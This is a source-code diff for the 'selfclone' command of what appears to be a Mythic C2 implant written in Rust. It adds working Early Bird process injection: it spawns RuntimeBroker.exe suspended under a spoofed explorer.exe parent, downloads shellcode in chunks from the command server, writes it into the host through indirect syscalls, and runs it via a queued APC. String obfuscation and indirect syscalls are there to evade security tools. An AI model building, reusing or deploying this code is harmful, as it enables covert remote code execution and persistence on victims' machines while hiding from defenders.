@@ -1,3 +1,11 @@
+//! selfclone — spawn a new agent without a direct parent/child link to this process.
+//!
+//! # Modes
+//! - **earlybird** (default): Create a sacrificial host `CREATE_SUSPENDED` with PPID
+//!   spoofing, write Donut shellcode into it, `NtQueueApcThread` on the primary thread
+//!   (Early Bird), then `NtResumeThread`. The APC runs before the host entry point.
+//! - **process**: legacy CreateProcess of the on-disk EXE under a spoofed PPID.
+
 use crate::transport;
 use callghost::syscall;
 
@@ -5,22 +13,33 @@ use std::mem;
 use std::ptr;
 use std::slice;
 
-use winapi::shared::ntdef::{PVOID, ULONG, UNICODE_STRING, LARGE_INTEGER, HANDLE};
+use base64::engine::general_purpose;
+use base64::Engine;
+use obfstr::obfstr;
+use serde::Deserialize;
+use serde_json::{json, Value};
 use winapi::shared::minwindef::{FALSE, LPVOID};
+use winapi::shared::ntdef::{HANDLE, LARGE_INTEGER, PVOID, ULONG, UNICODE_STRING};
 use winapi::um::handleapi::CloseHandle;
 use winapi::um::libloaderapi::GetModuleFileNameW;
 use winapi::um::processthreadsapi::{
-    CreateProcessW, InitializeProcThreadAttributeList, UpdateProcThreadAttribute,
-    DeleteProcThreadAttributeList, PROCESS_INFORMATION, STARTUPINFOW,
+    CreateProcessW, DeleteProcThreadAttributeList, InitializeProcThreadAttributeList,
+    UpdateProcThreadAttribute, PROCESS_INFORMATION, STARTUPINFOW,
 };
-use winapi::um::winbase::{CREATE_NEW_CONSOLE, EXTENDED_STARTUPINFO_PRESENT};
+use winapi::um::winbase::{
+    CREATE_NO_WINDOW, CREATE_SUSPENDED, EXTENDED_STARTUPINFO_PRESENT,
+};
 use winapi::um::winnt::PROCESS_ALL_ACCESS;
-use obfstr::obfstr;
 
 const MAX_PATH_LEN: usize = 260;
 const SystemProcessInformation: u32 = 5;
 const BUFFER_SIZE: usize = 0x100000;
 const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;
+const MEM_COMMIT: u32 = 0x1000;
+const MEM_RESERVE: u32 = 0x2000;
+const PAGE_READWRITE: u32 = 0x04;
+const PAGE_EXECUTE_READ: u32 = 0x20;
+const CHUNK_SIZE: usize = 4096;
 
 type LONG = i32;
 type KPRIORITY = LONG;
@@ -81,6 +100,28 @@ struct SYSTEM_PROCESS_INFORMATION {
 struct STARTUPINFOEXW {
     startup_info: STARTUPINFOW,
     lp_attribute_list: PVOID,
+}
+
+#[derive(Deserialize)]
+struct SelfCloneParams {
+    #[serde(default = "default_mode")]
+    mode: String,
+    #[serde(default = "default_parent")]
+    parent: String,
+    #[serde(default = "default_host")]
+    host: String,
+    #[serde(default)]
+    shellcode_file_id: String,
+}
+
+fn default_mode() -> String {
+    "earlybird".into()
+}
+fn default_parent() -> String {
+    "explorer.exe".into()
+}
+fn default_host() -> String {
+    r"C:\Windows\System32\RuntimeBroker.exe".into()
 }
 
 /// Find the PID of a process by name using NtQuerySystemInformation via indirect syscall.
@@ -170,10 +211,93 @@ unsafe fn open_process(pid: u32) -> Option<HANDLE> {
     }
 }
 
-/// Spawn a clone of the current process with a spoofed parent PID.
-fn clone_with_ppid_spoof(parent_handle: HANDLE) -> Result<u32, String> {
+/// Build a UTF-16 null-terminated path buffer for CreateProcessW.
+fn to_wide_path(path: &str) -> Vec<u16> {
+    let mut wide: Vec<u16> = path.encode_utf16().collect();
+    wide.push(0);
+    wide
+}
+
+/// Create a process under a spoofed parent. Returns (pid, hProcess, hThread).
+/// Caller owns the handles when `leave_handles` is true; otherwise they are closed.
+unsafe fn create_with_ppid(
+    app_path: &[u16],
+    parent_handle: HANDLE,
+    creation_flags: u32,
+    leave_handles: bool,
+) -> Result<(u32, HANDLE, HANDLE), String> {
+    let mut attr_size: usize = 0;
+    InitializeProcThreadAttributeList(ptr::null_mut(), 1, 0, &mut attr_size as *mut _);
+    if attr_size == 0 {
+        return Err("Failed to get attribute list size".into());
+    }
+
+    let attr_list = vec![0u8; attr_size];
+    let attr_list_ptr = attr_list.as_ptr() as PVOID;
+
+    let ret = InitializeProcThreadAttributeList(
+        attr_list_ptr as *mut _,
+        1,
+        0,
+        &mut attr_size as *mut _,
+    );
+    if ret == 0 {
+        return Err("InitializeProcThreadAttributeList failed".into());
+    }
+
+    let mut parent_h = parent_handle;
+    let ret = UpdateProcThreadAttribute(
+        attr_list_ptr as *mut _,
+        0,
+        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+        &mut parent_h as *mut _ as LPVOID,
+        mem::size_of::<HANDLE>(),
+        ptr::null_mut(),
+        ptr::null_mut(),
+    );
+    if ret == 0 {
+        DeleteProcThreadAttributeList(attr_list_ptr as *mut _);
+        return Err("UpdateProcThreadAttribute failed".into());
+    }
+
+    let mut si_ex: STARTUPINFOEXW = mem::zeroed();
+    si_ex.startup_info.cb = mem::size_of::<STARTUPINFOEXW>() as u32;
+    si_ex.lp_attribute_list = attr_list_ptr;
+
+    let mut pi: PROCESS_INFORMATION = mem::zeroed();
+
+    let ret = CreateProcessW(
+        app_path.as_ptr(),
+        ptr::null_mut(),
+        ptr::null_mut(),
+        ptr::null_mut(),
+        FALSE,
+        EXTENDED_STARTUPINFO_PRESENT | creation_flags,
+        ptr::null_mut(),
+        ptr::null_mut(),
+        &mut si_ex.startup_info as *mut _,
+        &mut pi as *mut _,
+    );
+
+    DeleteProcThreadAttributeList(attr_list_ptr as *mut _);
+
+    if ret == 0 {
+        return Err("CreateProcessW failed".into());
+    }
+
+    let pid = pi.dwProcessId;
+    if leave_handles {
+        Ok((pid, pi.hProcess, pi.hThread))
+    } else {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        Ok((pid, ptr::null_mut(), ptr::null_mut()))
+    }
+}
+
+/// Legacy: spawn a copy of the on-disk EXE under a spoofed PPID.
+fn clone_process_mode(parent_handle: HANDLE) -> Result<u32, String> {
     unsafe {
-        // Get our own executable path
         let mut path_buf = [0u16; MAX_PATH_LEN * 2];
         let len = GetModuleFileNameW(
             ptr::null_mut(),
@@ -183,130 +307,252 @@ fn clone_with_ppid_spoof(parent_handle: HANDLE) -> Result<u32, String> {
         if len == 0 {
             return Err("Failed to get own executable path".into());
         }
-
-        // Initialize the attribute list for PPID spoofing
-        let mut attr_size: usize = 0;
-
-        // First call to get required size
-        InitializeProcThreadAttributeList(
-            ptr::null_mut(),
-            1,
-            0,
-            &mut attr_size as *mut _,
-        );
-
-        if attr_size == 0 {
-            return Err("Failed to get attribute list size".into());
-        }
-
-        let attr_list = vec![0u8; attr_size];
-        let attr_list_ptr = attr_list.as_ptr() as PVOID;
-
-        let ret = InitializeProcThreadAttributeList(
-            attr_list_ptr as *mut _,
-            1,
-            0,
-            &mut attr_size as *mut _,
-        );
-        if ret == 0 {
-            return Err("InitializeProcThreadAttributeList failed".into());
-        }
-
-        // Set the parent process attribute
-        let mut parent_h = parent_handle;
-        let ret = UpdateProcThreadAttribute(
-            attr_list_ptr as *mut _,
-            0,
-            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-            &mut parent_h as *mut _ as LPVOID,
-            mem::size_of::<HANDLE>(),
-            ptr::null_mut(),
-            ptr::null_mut(),
-        );
-        if ret == 0 {
-            DeleteProcThreadAttributeList(attr_list_ptr as *mut _);
-            return Err("UpdateProcThreadAttribute failed".into());
-        }
-
-        // Set up STARTUPINFOEXW
-        let mut si_ex: STARTUPINFOEXW = mem::zeroed();
-        si_ex.startup_info.cb = mem::size_of::<STARTUPINFOEXW>() as u32;
-        si_ex.lp_attribute_list = attr_list_ptr;
-
-        let mut pi: PROCESS_INFORMATION = mem::zeroed();
-
-        // Create the process with the spoofed parent
-        let ret = CreateProcessW(
-            path_buf.as_ptr(),                      // lpApplicationName (our own exe)
-            ptr::null_mut(),                        // lpCommandLine
-            ptr::null_mut(),                        // lpProcessAttributes
-            ptr::null_mut(),                        // lpThreadAttributes
-            FALSE,                                  // bInheritHandles
-            EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, // dwCreationFlags
-            ptr::null_mut(),                        // lpEnvironment
-            ptr::null_mut(),                        // lpCurrentDirectory
-            &mut si_ex.startup_info as *mut _,      // lpStartupInfo
-            &mut pi as *mut _,                      // lpProcessInformation
-        );
-
-        // Clean up attribute list
-        DeleteProcThreadAttributeList(attr_list_ptr as *mut _);
-
-        if ret == 0 {
-            return Err("CreateProcessW failed".into());
-        }
-
-        let new_pid = pi.dwProcessId;
-
-        // Close handles — the new process is fully independent
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-
-        Ok(new_pid)
+        // CREATE_NO_WINDOW keeps console agents quiet; GUI subsystem ignores it.
+        let (pid, _, _) = create_with_ppid(
+            &path_buf[..(len as usize + 1)],
+            parent_handle,
+            CREATE_NO_WINDOW,
+            false,
+        )?;
+        Ok(pid)
     }
+}
+
+/// Early Bird: suspended host under PPID spoof + remote APC shellcode.
+unsafe fn earlybird_inject(
+    parent_handle: HANDLE,
+    host_path: &str,
+    shellcode: &[u8],
+) -> Result<u32, String> {
+    if shellcode.is_empty() {
+        return Err("empty shellcode".into());
+    }
+
+    let host_wide = to_wide_path(host_path);
+    let (pid, h_process, h_thread) = create_with_ppid(
+        &host_wide,
+        parent_handle,
+        CREATE_SUSPENDED | CREATE_NO_WINDOW,
+        true,
+    )?;
+
+    let cleanup = |h_process: HANDLE, h_thread: HANDLE| {
+        if !h_process.is_null() {
+            // Best-effort terminate so we don't leave a suspended corpse on failure.
+            let _ = syscall!(indirect, NtTerminateProcess, h_process, 1u32);
+            crate::nt_mem::close_handle(h_process as *mut _);
+        }
+        if !h_thread.is_null() {
+            crate::nt_mem::close_handle(h_thread as *mut _);
+        }
+    };
+
+    // Allocate RW in the host
+    let mut base: *mut core::ffi::c_void = ptr::null_mut();
+    let mut region_size = shellcode.len();
+    let status = syscall!(
+        indirect,
+        NtAllocateVirtualMemory,
+        h_process,
+        &mut base,
+        0usize,
+        &mut region_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE
+    );
+    if status != 0 || base.is_null() {
+        cleanup(h_process, h_thread);
+        return Err(format!("NtAllocateVirtualMemory failed: 0x{:08X}", status as u32));
+    }
+
+    let mut written: usize = 0;
+    let status = syscall!(
+        indirect,
+        NtWriteVirtualMemory,
+        h_process,
+        base,
+        shellcode.as_ptr(),
+        shellcode.len(),
+        &mut written
+    );
+    if status != 0 || written != shellcode.len() {
+        cleanup(h_process, h_thread);
+        return Err(format!(
+            "NtWriteVirtualMemory failed: 0x{:08X} written={}",
+            status as u32, written
+        ));
+    }
+
+    // RW → RX (no RWX)
+    let mut prot_base = base;
+    let mut prot_size = shellcode.len();
+    let mut old_prot: u32 = 0;
+    let status = syscall!(
+        indirect,
+        NtProtectVirtualMemory,
+        h_process,
+        &mut prot_base,
+        &mut prot_size,
+        PAGE_EXECUTE_READ,
+        &mut old_prot
+    );
+    if status != 0 {
+        cleanup(h_process, h_thread);
+        return Err(format!("NtProtectVirtualMemory failed: 0x{:08X}", status as u32));
+    }
+
+    // Queue APC on the primary thread (Early Bird)
+    let status = syscall!(
+        indirect,
+        NtQueueApcThread,
+        h_thread,
+        base,
+        ptr::null_mut::<u8>(),
+        ptr::null_mut::<u8>(),
+        ptr::null_mut::<u8>()
+    );
+    if status != 0 {
+        cleanup(h_process, h_thread);
+        return Err(format!("NtQueueApcThread failed: 0x{:08X}", status as u32));
+    }
+
+    // Resume — APC runs before host entry
+    let mut suspend_count: u32 = 0;
+    let status = syscall!(
+        indirect,
+        NtResumeThread,
+        h_thread,
+        &mut suspend_count
+    );
+    if status != 0 {
+        cleanup(h_process, h_thread);
+        return Err(format!("NtResumeThread failed: 0x{:08X}", status as u32));
+    }
+
+    // Detach: leave the host running independently
+    crate::nt_mem::close_handle(h_process as *mut _);
+    crate::nt_mem::close_handle(h_thread as *mut _);
+
+    Ok(pid)
+}
+
+fn download_file(task_id: &str, file_id: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+    let mut file_bytes = Vec::new();
+    let mut chunk_num = 1usize;
+    let mut total_chunks = 1usize;
+
+    while chunk_num <= total_chunks {
+        let payload = json!({
+            obfstr!("action"): obfstr!("post_response"),
+            obfstr!("responses"): [{
+                obfstr!("upload"): {
+                    obfstr!("chunk_size"): CHUNK_SIZE,
+                    obfstr!("file_id"): file_id,
+                    obfstr!("chunk_num"): chunk_num,
+                },
+                obfstr!("task_id"): task_id,
+                obfstr!("completed"): true
+            }]
+        })
+        .to_string();
+        let resp: Value = crate::transport::send_request_with_response(&payload)?;
+        let entry = &resp[obfstr!("responses")][0];
+        total_chunks = entry[obfstr!("total_chunks")]
+            .as_u64()
+            .ok_or("Bad total_chunks")? as usize;
+        let chunk_data = entry[obfstr!("chunk_data")]
+            .as_str()
+            .ok_or("Missing chunk_data")?;
+        let bytes = general_purpose::STANDARD.decode(chunk_data)?;
+        file_bytes.extend_from_slice(&bytes);
+        chunk_num += 1;
+    }
+
+    Ok(file_bytes)
 }
 
 pub fn selfclone(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
     let id = task.get("id").unwrap().as_str().unwrap();
     let timestamp = task.get(obfstr!("timestamp")).unwrap().as_f64().unwrap();
 
-    // Parse optional parent process name from parameters
-    let params_str = task.get("parameters").and_then(|p| p.as_str()).unwrap_or("{}");
-    let params: serde_json::Value = serde_json::from_str(params_str).unwrap_or(serde_json::json!({}));
-    let parent_name = params.get("parent")
-        .and_then(|v| v.as_str())
-        .unwrap_or("explorer.exe");
+    let params_str = task
+        .get("parameters")
+        .and_then(|p| p.as_str())
+        .unwrap_or("{}");
+    let params: SelfCloneParams =
+        serde_json::from_str(params_str).unwrap_or(SelfCloneParams {
+            mode: default_mode(),
+            parent: default_parent(),
+            host: default_host(),
+            shellcode_file_id: String::new(),
+        });
 
-    crate::helpers::churn(parent_name);
+    let mode = params.mode.to_lowercase();
+    let parent_name = params.parent;
+    let host_path = params.host;
+
+    crate::helpers::churn(&parent_name);
 
     let (output, status) = unsafe {
-        // Step 1: Find the target parent process
-        match find_process_pid(parent_name) {
-            None => {
-                (format!("Failed to find parent process: {}", parent_name), "error")
-            }
-            Some(parent_pid) => {
-                // Step 2: Open handle to the parent
-                match open_process(parent_pid) {
-                    None => {
-                        (format!("Failed to open handle to {} (PID {})", parent_name, parent_pid), "error")
-                    }
-                    Some(parent_handle) => {
-                        // Step 3: Create the clone with spoofed PPID
-                        let result = clone_with_ppid_spoof(parent_handle);
-                        crate::nt_mem::close_handle(parent_handle as *mut _);
-
-                        match result {
-                            Ok(new_pid) => {
-                                (format!("Cloned under {} (PID {}). New process PID: {}", parent_name, parent_pid, new_pid), "success")
-                            }
-                            Err(e) => {
-                                (format!("Clone failed: {}", e), "error")
+        match find_process_pid(&parent_name) {
+            None => (
+                format!("Failed to find parent process: {}", parent_name),
+                "error",
+            ),
+            Some(parent_pid) => match open_process(parent_pid) {
+                None => (
+                    format!(
+                        "Failed to open handle to {} (PID {})",
+                        parent_name, parent_pid
+                    ),
+                    "error",
+                ),
+                Some(parent_handle) => {
+                    let result = if mode == "process" {
+                        clone_process_mode(parent_handle)
+                    } else {
+                        // earlybird (default)
+                        if params.shellcode_file_id.is_empty() {
+                            Err(
+                                "earlybird mode requires shellcode_file_id from Mythic container"
+                                    .into(),
+                            )
+                        } else {
+                            match download_file(id, &params.shellcode_file_id) {
+                                Ok(sc) => {
+                                    crate::helpers::churn("earlybird_sc");
+                                    earlybird_inject(parent_handle, &host_path, &sc)
+                                }
+                                Err(e) => Err(format!("shellcode download failed: {}", e)),
                             }
                         }
+                    };
+                    crate::nt_mem::close_handle(parent_handle as *mut _);
+
+                    match result {
+                        Ok(new_pid) => {
+                            if mode == "process" {
+                                (
+                                    format!(
+                                        "Cloned under {} (PID {}). New process PID: {}",
+                                        parent_name, parent_pid, new_pid
+                                    ),
+                                    "success",
+                                )
+                            } else {
+                                (
+                                    format!(
+                                        "Early Bird under {} (PID {}) host={} → new PID {}",
+                                        parent_name, parent_pid, host_path, new_pid
+                                    ),
+                                    "success",
+                                )
+                            }
+                        }
+                        Err(e) => (format!("selfclone failed: {}", e), "error"),
                     }
                 }
-            }
+            },
         }
     };
 
